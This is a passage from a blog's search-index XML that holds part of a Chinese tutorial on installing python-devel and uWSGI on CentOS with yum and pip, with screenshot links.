src="https://img-blog.csdnimg.cn/20190513172343638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装python依赖</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install -y python-devel</span><br></pre></td></tr></table></figure><p>正确截图<br><img src="https://img-blog.csdnimg.cn/20190513172402388.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>2安装uwsgi</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install uwsgi</span><br></pre></td></tr></table></figure><p>正确截图<img src="https://img-blog.csdnimg.cn/20190513172421418.png" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> 配环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> centos uwsgi 错误 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
